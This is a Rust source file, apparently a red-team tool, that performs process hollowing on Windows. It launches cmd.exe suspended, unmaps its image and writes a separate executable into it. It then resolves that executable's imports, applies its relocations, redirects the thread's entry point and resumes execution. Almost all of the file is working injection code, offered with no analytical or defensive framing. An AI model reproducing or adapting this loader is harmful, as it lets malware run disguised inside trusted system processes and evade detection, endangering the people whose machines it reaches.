
use std::fmt::Write;
use std::io::Read;
use std::mem::transmute;
//use std::slice::Concat;
use std::task::Context;
use winapi::ctypes::{c_schar,c_char};
use winapi::shared::basetsd::DWORD32;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::shared::ntdef::ULONGLONG;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, WriteProcessMemory, VirtualAllocEx, VirtualProtectEx};
use winapi::um::processthreadsapi::{CreateThread,GetCurrentProcess, CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, GetThreadContext, SetThreadContext, ResumeThread};
use winapi::um::winnt::{WCHAR, IMAGE_IMPORT_BY_NAME, IMAGE_THUNK_DATA64, IMAGE_THUNK_DATA64_u1};
use winapi::{ctypes::c_void, um::memoryapi::ReadProcessMemory};
use winapi::um::libloaderapi::{LoadLibraryW,GetProcAddress, LoadLibraryA};
use winapi::um::errhandlingapi::{GetLastError};
use std::alloc::{alloc, Layout};
use widestring;
use std::ffi::{CString,CStr};
use winapi::um::winnt::*;


pub fn ProcessHollow64(prochandle:*mut c_void,mut remotebase:*mut c_void,buffer:Vec<u8>,threadhandle:*mut c_void){
    use ntapi::ntmmapi::NtUnmapViewOfSection;

    let headerssize = GetHeadersSize(&buffer);
    let imagesize = GetImageSize(&buffer);

    unsafe{
        
        let localbaseaddress =VirtualAlloc(std::ptr::null_mut(), imagesize, 0x1000, 0x40);
      

        NtUnmapViewOfSection(prochandle, remotebase);
        

        remotebase = VirtualAllocEx(prochandle, remotebase, imagesize, 0x1000+0x2000, 0x40) as *mut c_void;
        let mut oldprotect = 0;
        VirtualProtectEx(prochandle, remotebase, imagesize, 0x40, &mut oldprotect);

        
        // written headers to remote process
        WriteProcessMemory(prochandle, remotebase, 
        buffer.as_ptr() as *const c_void, headerssize, std::ptr::null_mut());

        // parsing locally
        std::ptr::copy(buffer.as_ptr() as *const u8, localbaseaddress as *mut u8, headerssize);
        
        let mut dosheader:IMAGE_DOS_HEADER = std::mem::zeroed();
        FillStructureFromMemory(&mut dosheader, localbaseaddress as *const c_void, GetCurrentProcess());

        let mut ntheader = IMAGE_NT_HEADERS64::default();
        FillStructureFromMemory(&mut ntheader, (localbaseaddress as usize + dosheader.e_lfanew as usize) as *const c_void, GetCurrentProcess());
  


        let mut sections:Vec<IMAGE_SECTION_HEADER> = vec![IMAGE_SECTION_HEADER::default();ntheader.FileHeader.NumberOfSections as usize];

        // mapping sections in remote process
        for i in 0..sections.len(){

            FillStructureFromMemory(&mut sections[i],
                ((localbaseaddress as usize + dosheader.e_lfanew as usize + std::mem::size_of_val(&ntheader) as usize + (i*std::mem::size_of::<IMAGE_SECTION_HEADER>()) as usize)) as *const c_void,
                 GetCurrentProcess());
                    
                 let temp:Vec<u8> = buffer[sections[i].PointerToRawData as usize..(sections[i].PointerToRawData as usize+sections[i].SizeOfRawData as usize)].to_vec();
    

                WriteProcessMemory(GetCurrentProcess(),
                        (localbaseaddress as usize+sections[i].VirtualAddress as usize) as *mut c_void,
                         temp.as_ptr() as *const c_void, 
                         sections[i].SizeOfRawData as usize, std::ptr::null_mut());
       
    
                WriteProcessMemory(prochandle,
                     (remotebase as usize+sections[i].VirtualAddress as usize) as *mut c_void,
                      temp.as_ptr() as *const c_void, 
                      sections[i].SizeOfRawData as usize, std::ptr::null_mut());
    
        }
    

        // fixing IAT

        if ntheader.OptionalHeader.ImportTable.Size > 0{
    
            let mut ogfirstthunkptr = localbaseaddress as usize + ntheader.OptionalHeader.ImportTable.VirtualAddress as usize;
            
            while true {

                
                let mut import = IMAGE_IMPORT_DESCRIPTOR::default();

                FillStructureFromMemory(&mut import, 
                ogfirstthunkptr as *const c_void, prochandle);

            
                if import.Name ==0 && import.FirstThunk ==0{
                    break;
                }

                let dllname = ReadStringFromMemory(
                (localbaseaddress as usize + import.Name as usize) as *const u8,
                 GetCurrentProcess());

                 //println!("DLL Name: {}",dllname);
                 let dllhandle =LoadLibraryA(dllname.as_bytes().as_ptr() as *const i8);

                let mut thunkptr =  localbaseaddress as usize + import.Characteristics_or_OriginalFirstThunk as usize;

                    let mut i = 0;

                while true{



                    let mut thunkdata = MY_IMAGE_THUNK_DATA64::default();

                    FillStructureFromMemory(&mut thunkdata,(thunkptr as usize)as *const c_void, GetCurrentProcess());

                    if thunkdata.Address == [0;8] && 
                    u64::from_ne_bytes(thunkdata.Address.try_into().unwrap())<0x8000000000000000
                    {
                        break;
                    }

                    ////println!("thunkdata: {:x?}",thunkdata); 
                    let offset = u64::from_ne_bytes(thunkdata.Address.try_into().unwrap());

                    let funcname = ReadStringFromMemory(
                        (localbaseaddress as usize+ offset as usize+ 2) as *const u8, GetCurrentProcess());

                        //println!("function name: {}",funcname);

                        if funcname!=""{
                        let funcaddress = GetProcAddress(dllhandle, funcname.as_bytes().as_ptr() as *const i8);

                        let finalvalue =i64::to_ne_bytes(funcaddress as i64);

                        WriteProcessMemory(GetCurrentProcess(), 
                            
                        (localbaseaddress as usize + import.FirstThunk as usize +(i*8) ) as *mut c_void,
                        finalvalue.as_ptr() as *const c_void ,
                         finalvalue.len(), std::ptr::null_mut());
                        
                        
                         WriteProcessMemory(prochandle, 
                            
                            (remotebase as usize + import.FirstThunk as usize +(i*8) ) as *mut c_void,
                            finalvalue.as_ptr() as *const c_void ,
                             finalvalue.len(), std::ptr::null_mut());
                        
                        }



                        
                    }

                            i+=1;

                    thunkptr += 8;
                        
                }

                ogfirstthunkptr += std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();


            }




            // fixing base relocations
            if ntheader.OptionalHeader.BaseRelocationTable.Size > 0{
    
                let diffaddress = remotebase as usize - ntheader.OptionalHeader.ImageBase as usize;
                  let mut relocptr = localbaseaddress as usize + ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress as usize;
      
                  while true {
                      
                      let mut reloc1 = MY_IMAGE_BASE_RELOCATION::default();
      
      
                      FillStructureFromMemory(&mut reloc1, relocptr as *const c_void, GetCurrentProcess());
      
                      if reloc1.SizeofBlock ==0 {
                          break;
                      }
      
                      //println!("page rva: {:x?}",reloc1.VirtualAddress);
                      //println!("block size: {:x?}",reloc1.SizeofBlock);
      
      
                      let  entries =(reloc1.SizeofBlock-8) /2 ;
                      
                      //println!("entries: {:x?}",entries);
      
                      
      
                      for i in 0..entries{
      
      
                          let mut relocoffset:[u8;2] = [0;2];
      
                          ReadProcessMemory(GetCurrentProcess(),
                          ( relocptr +8+(i*2) as usize)as *const c_void, 
                          relocoffset.as_mut_ptr() as *mut c_void, 
                          2, std::ptr::null_mut());
      
                          let temp = u16::from_ne_bytes(relocoffset.try_into().unwrap());
      
                              ////println!("{:x?}",temp&0x0fff);
      
                              let type1 = temp >> 12;
                          if type1==0xA{
      
                              // 1&0=0  0&0=0
                          let finaladdress = remotebase as usize + reloc1.VirtualAddress as usize + (temp&0x0fff) as usize;
      
                           let mut ogaddress:[u8;8] = [0;8];
                           
                           ReadProcessMemory(GetCurrentProcess(), 
                           finaladdress as *const c_void, 
                           ogaddress.as_mut_ptr() as *mut c_void, 
                           8, std::ptr::null_mut());
      
      
                          let fixedaddress= isize::from_ne_bytes(ogaddress.try_into().unwrap()) + diffaddress as isize;
      
      
                              WriteProcessMemory(prochandle, 
                              finaladdress as *mut c_void, 
                              fixedaddress.to_ne_bytes().as_ptr() as *const c_void, 
                              8, std::ptr::null_mut());
                              }
                      }
      
      
                      relocptr += reloc1.SizeofBlock as usize;
      
                  }
      
      
              }







        let mut ctx = std::mem::zeroed::<CONTEXT>();
    
            ctx.ContextFlags = CONTEXT_INTEGER;

            GetThreadContext(threadhandle, &mut ctx);

            ctx.Rcx = remotebase as u64 + ntheader.OptionalHeader.AddressOfEntryPoint as u64;
    

            SetThreadContext(threadhandle, &mut ctx);




            VirtualFree(localbaseaddress, 0, 0x00008000);


        }


       



    
}



#[derive(Debug,Clone,Default)]
pub struct MY_IMAGE_BASE_RELOCATION{
    VirtualAddress: u32,
    SizeofBlock: u32

}



pub fn GetProcessImageBase(prochandle:*mut c_void) -> i64 {
    unsafe{

        use ntapi::ntpsapi::*;

        let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

        let mut returnlength = 0;
        NtQueryInformationProcess(prochandle,
            0,
            &mut pbi as *mut _ as *mut c_void,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut returnlength);

        let mut baseaddr:[u8;8] = [0;8];

        ReadProcessMemory(prochandle, 
        (pbi.PebBaseAddress as usize+0x10) as *const c_void, 
        baseaddr.as_mut_ptr() as *mut c_void, 
        8, std::ptr::null_mut());


        let imagebase =i64::from_ne_bytes(baseaddr.try_into().unwrap());

        return imagebase;

    }

}








fn main() {
    
    let mut processname = "C:\\Windows\\System32\\cmd.exe\0";
    unsafe{

        
       /*  let mut si = std::mem::zeroed::<STARTUPINFOA>();

        let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();
        
        let res =CreateProcessA(processname.as_ptr() as *const i8,
        std::ptr::null_mut(), 
        std::ptr::null_mut() ,
        std::ptr::null_mut(), 0, 
        0x10, std::ptr::null_mut(),
        std::ptr::null_mut(), 
        &mut si as &mut STARTUPINFOA,
         &mut pi as &mut PROCESS_INFORMATION);

*/


        
        
        
        let mut buffer:Vec<u8> = Vec::new();
    //
    let mut fd =File::open(r#"D:\red teaming tools\calc2.exe"#).unwrap();
    

    fd.read_to_end(&mut buffer);



        let mut si:STARTUPINFOA = std::mem::zeroed();

       // let mut si = std::mem::MaybeUninit::<STARTUPINFOA>::uninit();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        
       

        let mut pi:PROCESS_INFORMATION = std::mem::zeroed();
    
        let res =CreateProcessA(
            processname.as_ptr() as *mut i8,
     std::ptr::null_mut(), 
     
     std::ptr::null_mut(), 
     std::ptr::null_mut(), 
     0, 
     0x00000004, std::ptr::null_mut(), 
     std::ptr::null(), 
     &mut si as &mut STARTUPINFOA ,
      &mut pi as &mut PROCESS_INFORMATION );


      println!("getlasterror: {}",GetLastError());

      let imagebase = GetProcessImageBase(pi.hProcess);
      
      ProcessHollow64(pi.hProcess, imagebase as *mut c_void, buffer, pi.hThread);


      ResumeThread(pi.hThread);

    }
}





pub fn FillStructureFromArray<T, U>(base: &mut T, arr: &[U]) -> usize {
    unsafe {
        ////println!("{}",std::mem::size_of::<T>());
         ////println!("{}",std::mem::size_of_val(arr));
        /*if std::mem::size_of::<T>() != std::mem::size_of_val(arr) {
            //println!("{}", std::mem::size_of::<T>());
            //println!("{}", std::mem::size_of_val(arr));
            panic!("sizes are not equal to copy");
        }*/

        let mut handle = GetCurrentProcess();
        let mut byteswritten = 0;
        let res = WriteProcessMemory(
            handle,
            base as *mut _ as *mut c_void,
            arr as *const _ as *const c_void,
            std::mem::size_of::<T>(),
            &mut byteswritten,
        );

        return byteswritten;
    }
}

pub fn FillStructureFromMemory<T>(dest: &mut T,src: *const c_void,prochandle: *mut c_void,) -> usize {
    unsafe {
        let bytestoread: usize = std::mem::size_of::<T>();
        ////println!("size of structure is {}",bytestoread);
        let mut buffer: Vec<u8> = vec![0; bytestoread];
        let mut byteswritten = 0;

        let res = ReadProcessMemory(
            prochandle,
            src,
            buffer.as_mut_ptr() as *mut c_void,
            bytestoread,
            &mut byteswritten,
        );
        ////println!("array being filled: {:x?}",&buffer);
        FillStructureFromArray(dest, &buffer);

        return byteswritten;
    }
}



pub fn GetHeadersSize(buffer:&Vec<u8>) -> usize{
    if buffer.len()<2{ panic!("file size is less than 2")}
    let magic =&buffer[0..2];
    let magicstring =String::from_utf8_lossy(magic);
    if magicstring=="MZ"{
        if buffer.len()<64{ panic!("file size is less than 64")}
        let mut ntoffset =&buffer[60..64];
        unsafe{
        let offset = std::ptr::read(ntoffset.as_ptr() as *const i32) as usize;
        
        
        let bitversion =&buffer[offset+4+20..offset+4+20+2];
        let bit =std::ptr::read(bitversion.as_ptr() as *const u16);
        if bit==523{
            let index = offset + 24+60;
        let  headerssize =&buffer[index as usize..index as usize+4];
        let size = std::ptr::read(headerssize.as_ptr() as *const i32);
        //println!("size of headers: {:x?}",size);   
        return size as usize;

        }
        else if bit==267{
        let index = offset + 24+60;
        let  headerssize =&buffer[index as usize..index as usize+4];
        let size = std::ptr::read(headerssize.as_ptr() as *const i32);
        //println!("size of headers: {:x?}",size);   
        return size as usize;
        }
        else{
            panic!("invalid bit version");
        }
    }
        
    }
    else{
        panic!("its not a pe file");
    }
}


pub fn GetImageSize(buffer:&Vec<u8>) -> usize{
    if buffer.len()<2{ panic!("file size is less than 2")}
    let magic =&buffer[0..2];
    let magicstring =String::from_utf8_lossy(magic);
    if magicstring=="MZ"{
        if buffer.len()<64{ panic!("file size is less than 64")}
        let mut ntoffset =&buffer[60..64];
        unsafe{
        let offset = std::ptr::read(ntoffset.as_ptr() as *const i32) as usize;
        
        
        let bitversion =&buffer[offset+4+20..offset+4+20+2];
        let bit =std::ptr::read(bitversion.as_ptr() as *const u16);
        if bit==523{
            let index = offset + 24+60-4;
        let  headerssize =&buffer[index as usize..index as usize+4];
        let size = std::ptr::read(headerssize.as_ptr() as *const i32);
        //println!("size of image: {:x?}",size);   
        return size as usize;

        }
        else if bit==267{
        let index = offset + 24+60-4;
        let  headerssize =&buffer[index as usize..index as usize+4];
        let size = std::ptr::read(headerssize.as_ptr() as *const i32);
        //println!("size of image: {:x?}",size);   
        return size as usize;
        }
        else{
            panic!("invalid bit version");
        }
    }
        
    }
    else{
        panic!("its not a pe file");
    }
}


pub fn ReadStringFromMemory(baseaddress:*const u8,phandle:*mut c_void) -> String{

    let mut temp:Vec<u8> = vec![0;100];
    let mut bytesread:usize = 0;
    unsafe{
        let mut i = 0;
        loop{
        let res =ReadProcessMemory(phandle,
            (baseaddress as isize+i) as *const c_void, 
        (temp.as_mut_ptr() as usize + i as usize) as *mut c_void,
            1,
            &mut bytesread );
            

            if temp[i as usize]==0{
               // //println!("{:x?}",i);
                break;
            }
            i +=1;
    }
    let dllname =String::from_utf8_lossy(&temp);
    dllname.to_string()
    }
}



#[derive(Debug,Default,Clone)]
struct MY_IMAGE_THUNK_DATA64{
    Address: [u8;8]
}


use std::fs::File;




#[derive(Debug, Default, Clone)]
#[repr(C)]

pub struct IMAGE_DOS_HEADER {
    e_magic: [u8; 2],  // Magic number
    e_cblp: u16,       // Bytes on last page of file
    e_cp: u16,         // Pages in file
    e_crlc: u16,       // Relocations
    e_cparhdr: u16,    // Size of header in paragraphs
    e_minalloc: u16,   // Minimum extra paragraphs needed
    e_maxalloc: u16,   // Maximum extra paragraphs needed
    e_ss: u16,         // Initial (relative) SS value
    e_sp: u16,         // Initial SP value
    e_csum: u16,       // Checksum
    e_ip: u16,         // Initial IP value
    e_cs: u16,         // Initial (relative) CS value
    e_lfarlc: u16,     // File address of relocation table
    e_ovno: u16,       // Overlay number
    e_res1: [u16; 4],  // Reserved words
    e_oemid: u16,      // OEM identifier (for e_oeminfo)
    e_oeminfo: u16,    // OEM information, e_oemid specific
    e_res2: [u16; 10], // Reserved words
    e_lfanew: i32,     // File address of new exe header
}



#[derive(Clone,Default,Debug)]
#[repr(C)]
pub  struct IMAGE_SECTION_HEADER{
           Name:[u8;8],
            VirtualSize: u32,
           VirtualAddress: u32,
         SizeOfRawData: u32,
          PointerToRawData: u32,
          PointerToRelocations: u32,
          PointerToLinenumbers: u32,
           NumberOfRelocations: u16,
           NumberOfLinenumbers: u16,
          Characteristics: u32
        
    }

impl IMAGE_SECTION_HEADER{
    fn getsecname(&mut self)-> String {
         String::from_utf8_lossy(&self.Name).to_string()
    }
}


#[repr(C)]
pub union chars_or_originalfirstthunk {
    Characteristics: u32,
    OriginalFirstThunk: u32,
}

#[derive(Debug, Clone, Default)]
#[repr(C)]
pub struct IMAGE_IMPORT_DESCRIPTOR {
    Characteristics_or_OriginalFirstThunk: u32,

    TimeDateStamp: u32,

    ForwarderChain: u32,

    Name: u32,

    FirstThunk: u32,
}

#[repr(C)]
pub union IMAGE_THUNK_DATA32 {
    pub ForwarderString: u32,

    pub Function: u32,

    pub Ordinal: u32,

    pub AddressOfData: u32,
}

#[derive(Debug, Clone, Default)]
#[repr(C)]
pub struct IMAGE_EXPORT_DIRECTORY {
    pub Characteristics: u32,
    pub TimeDateStamp: u32,
    pub MajorVersion: u16,
    pub MinorVersion: u16,
    pub Name: u32,
    pub Base: u32,
    pub NumberOfFnctions: u32,
    pub NumberOfNames: u32,
    pub AddressOfFunctions: u32,    // RVA from base of image
    pub AddressOfNames: u32,        // RVA from base of image
    pub AddressOfNameOrdinals: u32, // RVA from base of image
}

#[derive(Debug, Default, Clone)]
#[repr(C)]
pub struct IMAGE_OPTIONAL_HEADER64 {
    Magic: u16,

    MajorLinkerVersion: u8,

    MinorLinkerVersion: u8,

    SizeOfCode: u32,

    SizeOfInitializedData: u32,

    SizeOfUninitializedData: u32,

    AddressOfEntryPoint: u32,

    BaseOfCode: u32,

    ImageBase: i64,

    SectionAlignment: u32,

    FileAlignment: u32,

    MajorOperatingSystemVersion: u16,

    MinorOperatingSystemVersion: u16,

    MajorImageVersion: u16,

    MinorImageVersion: u16,

    MajorSubsystemVersion: u16,

    MinorSubsystemVersion: u16,

    Win32VersionValue: u32,

    SizeOfImage: u32,

    SizeOfHeaders: u32,

    CheckSum: u32,

    Subsystem: u16,

    DllCharacteristics: u16,

    SizeOfStackReserve: u64,

    SizeOfStackCommit: u64,

    SizeOfHeapReserve: u64,

    SizeOfHeapCommit: u64,

    LoaderFlags: u32,

    NumberOfRvaAndSizes: u32,

    ExportTable: IMAGE_DATA_DIRECTORY,

    ImportTable: IMAGE_DATA_DIRECTORY,

    ResourceTable: IMAGE_DATA_DIRECTORY,

    ExceptionTable: IMAGE_DATA_DIRECTORY,

    CertificateTable: IMAGE_DATA_DIRECTORY,

    BaseRelocationTable: IMAGE_DATA_DIRECTORY,

    Debug: IMAGE_DATA_DIRECTORY,

    Architecture: IMAGE_DATA_DIRECTORY,

    GlobalPtr: IMAGE_DATA_DIRECTORY,

    TLSTable: IMAGE_DATA_DIRECTORY,
    LoadConfigTable: IMAGE_DATA_DIRECTORY,
    BoundImport: IMAGE_DATA_DIRECTORY,

    IAT: IMAGE_DATA_DIRECTORY,

    DelayImportDescriptor: IMAGE_DATA_DIRECTORY,
    CLRRuntimeHeader: IMAGE_DATA_DIRECTORY,

    Reserved: IMAGE_DATA_DIRECTORY,
}

#[derive(Debug, Default, Clone)]
#[repr(C)]
pub struct IMAGE_OPTIONAL_HEADER32 {
    Magic: u16,

    MajorLinkerVersion: u8,

    MinorLinkerVersion: u8,

    SizeOfCode: u32,

    SizeOfInitializedData: u32,

    SizeOfUninitializedData: u32,

    AddressOfEntryPoint: u32,

    BaseOfCode: u32,

    // PE32 contains this additional field
    BaseOfData: u32,

    ImageBase: u32,

    SectionAlignment: u32,

    FileAlignment: u32,

    MajorOperatingSystemVersion: u16,

    MinorOperatingSystemVersion: u16,

    MajorImageVersion: u16,

    MinorImageVersion: u16,

    MajorSubsystemVersion: u16,

    MinorSubsystemVersion: u16,

    Win32VersionValue: u32,

    SizeOfImage: u32,

    SizeOfHeaders: u32,

    CheckSum: u32,

    Subsystem: u32,

    DllCharacteristics: u16,

    SizeOfStackReserve: u32,

    SizeOfStackCommit: u32,

    SizeOfHeapReserve: u32,

    SizeOfHeapCommit: u32,

    LoaderFlags: u32,

    NumberOfRvaAndSizes: u32,

    ExportTable: IMAGE_DATA_DIRECTORY,

    ImportTable: IMAGE_DATA_DIRECTORY,

    ResourceTable: IMAGE_DATA_DIRECTORY,

    ExceptionTable: IMAGE_DATA_DIRECTORY,

    CertificateTable: IMAGE_DATA_DIRECTORY,

    BaseRelocationTable: IMAGE_DATA_DIRECTORY,

    Debug: IMAGE_DATA_DIRECTORY,

    Architecture: IMAGE_DATA_DIRECTORY,

    GlobalPtr: IMAGE_DATA_DIRECTORY,

    TLSTable: IMAGE_DATA_DIRECTORY,
    LoadConfigTable: IMAGE_DATA_DIRECTORY,
    BoundImport: IMAGE_DATA_DIRECTORY,

    IAT: IMAGE_DATA_DIRECTORY,

    DelayImportDescriptor: IMAGE_DATA_DIRECTORY,
    CLRRuntimeHeader: IMAGE_DATA_DIRECTORY,

    Reserved: IMAGE_DATA_DIRECTORY,
}

#[derive(Debug, Default, Clone)]
#[repr(C)]
pub struct IMAGE_FILE_HEADER {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
}

#[derive(Debug, Default, Clone)]
#[repr(C)]
pub struct IMAGE_DATA_DIRECTORY {
    VirtualAddress: u32,
    Size: u32,
}

#[derive(Debug, Default, Clone)]
#[repr(C)]
pub struct IMAGE_NT_HEADERS32 {
    Signature: u32,

    FileHeader: IMAGE_FILE_HEADER,

    OptionalHeader: IMAGE_OPTIONAL_HEADER32,
}

#[derive(Debug, Default, Clone)]
#[repr(C)]
pub struct IMAGE_NT_HEADERS64 {
    Signature: u32,

    FileHeader: IMAGE_FILE_HEADER,

    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}





